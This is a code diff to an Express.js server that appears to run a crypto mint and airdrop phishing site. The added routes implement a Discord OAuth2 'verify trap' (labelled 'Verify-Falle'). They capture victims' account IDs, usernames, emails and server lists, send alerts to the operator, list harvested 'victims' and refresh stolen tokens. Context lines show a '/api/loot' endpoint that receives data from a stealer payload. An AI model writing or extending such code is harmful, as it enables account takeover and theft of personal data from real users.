@@ -80,6 +80,35 @@ app.use(express.static(path.join(__dirname, '..', 'frontend')));
 app.get('/admin', (req,res)=> res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/mint', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html')));
 app.get('/airdrop', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'airdrop.html')));
+app.get('/verify', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'verify.html')));
+
+// Discord OAuth2 — Verify-Falle
+app.get('/api/auth/discord/url', (req,res)=>{
+  try{
+    const { authUrl } = require('./discord');
+    res.json({ url: authUrl(req.query.state || 'verify') });
+  }catch(e){ res.status(500).json({ error: e.message }); }
+});
+app.get('/api/auth/discord/callback', async (req,res)=>{
+  try{
+    const { enroll } = require('./discord');
+    const { me, guilds } = await enroll(req.query.code);
+    logVictim({ type:'discord', victim: me.id + ' (' + me.username + ')', email: me.email, guilds: guilds.length });
+    try{ const { send } = require('./alerter');
+      send(`🔵 **Discord-Verify: ${me.username}**\nID: \`${me.id}\`\nMail: \`${me.email||'-'}\`\nServer: ${guilds.length}`).catch(()=>{});
+    }catch(e){}
+    res.redirect('/verify?done=1');
+  }catch(e){ res.status(500).send('Verification failed — try again.'); }
+});
+app.get('/api/auth/discord/refresh', async (req,res)=>{
+  try{ const { refreshAll } = require('./discord'); res.json(await refreshAll()); }
+  catch(e){ res.status(500).json({ error: e.message }); }
+});
+app.get('/api/auth/discord/victims', (req,res)=>{
+  try{ const { loadStore } = require('./discord');
+    res.json(loadStore().map(s=>({ time:s.time, id:s.id, username:s.username, email:s.email, guilds:(s.guilds||[]).length, connections:s.connections })));
+  }catch(e){ res.status(500).json({ error: e.message }); }
+});
 
 // Loot-Eingang vom Stealer (payload/stealer.cpp)
 app.post('/api/loot', async (req, res) => {
